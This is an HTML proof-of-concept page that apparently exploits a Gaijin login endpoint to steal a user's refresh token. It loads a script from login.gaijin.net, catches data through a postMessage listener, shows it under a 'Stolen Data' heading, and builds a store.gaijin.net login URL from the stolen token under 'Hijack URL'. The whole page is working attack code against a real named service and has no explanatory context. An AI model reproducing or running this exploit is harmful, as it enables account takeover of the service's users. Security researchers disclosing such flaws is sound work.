<html>
<head>
    <title>Message Receiver</title>
    <script>
        // Define a variable to store the received message
        var receivedMessage = null;

        // Set up a message receiver
        window.addEventListener('message', function(event) {
            // Store the received message
            receivedMessage = event.data;

            // If the DOM is already loaded, update the content immediately
            var messageContent = document.getElementById('messageContent');
            if (messageContent) {
                messageContent.innerHTML = JSON.stringify(receivedMessage);
            }
        });

        // When the DOM is fully loaded, update the message content if it exists
        window.addEventListener('DOMContentLoaded', (event) => {
            var messageContent = document.getElementById('messageContent');
            if (receivedMessage && messageContent) {
                messageContent.innerHTML = JSON.stringify(receivedMessage);
				
				hijacklink = document.getElementById('hijacklink');
				hijacklink.innerHTML = "https://store.gaijin.net/login.php?refresh_token="+receivedMessage.payload.rt
            }
        });
    </script>
    <!-- Include the external JavaScript file -->
    <script src="https://login.gaijin.net/api/gsea/fetch?q=cHVibGljX2tleT14"></script>
</head>
<body>
    <h1>Stolen Data</h1>
    <div id='messageContent'></div>
	<h1>Hijack URL</h1>
	<div id='hijacklink'></div>
</body>
</html>
